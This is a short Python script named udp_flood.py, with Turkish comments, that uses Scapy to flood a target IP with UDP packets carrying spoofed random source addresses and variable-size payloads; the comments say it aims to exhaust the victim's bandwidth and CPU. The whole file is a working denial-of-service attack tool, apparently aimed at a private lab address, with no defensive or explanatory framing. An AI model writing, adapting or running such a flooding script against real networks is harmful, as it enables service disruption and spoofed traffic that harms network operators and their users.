# udp_flood.py
#Bu saldırı, sahte IP'ler kullanarak kurbanın 
# bant genişliğini ve CPU'sunu büyük veri paketleriyle yormayı hedefler.
from scapy.all import *
import random

target_ip = "10.0.9.2"
target_port = 12345 # UDP'de portun çok önemi yok, rastgele olabilir

print(f"UDP Flood baslatiliyor: {target_ip}")



packets = []
for _ in range(1200):
    payload = "X" * random.choice([14, 56, 512, 1024])
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=RandIP(), dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)
    packets.append(pkt)

sendp(packets, inter=0.001, verbose=0)
print("UDP firtinasi dindi.")